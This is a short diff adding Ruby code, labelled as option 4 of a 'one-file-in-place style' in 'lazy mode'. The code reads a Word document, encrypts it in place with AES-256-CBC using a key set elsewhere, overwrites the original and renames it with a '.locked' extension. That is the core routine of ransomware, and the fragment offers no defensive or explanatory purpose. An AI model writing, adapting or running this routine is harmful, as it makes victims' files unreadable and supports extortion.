@@ -1,0 +1,9 @@
+# 4. one-file-in-place style — lazy mode
+path = "document.docx"
+data = File.binread(path)
+c = OpenSSL::Cipher.new("aes-256-cbc").encrypt.tap do |x|
+  x.key = k
+  x.iv  = x.random_iv
+end
+File.binwrite(path, c.update(data) + c.final)
+File.rename(path, path + ".locked")         # or just keep .locked extension
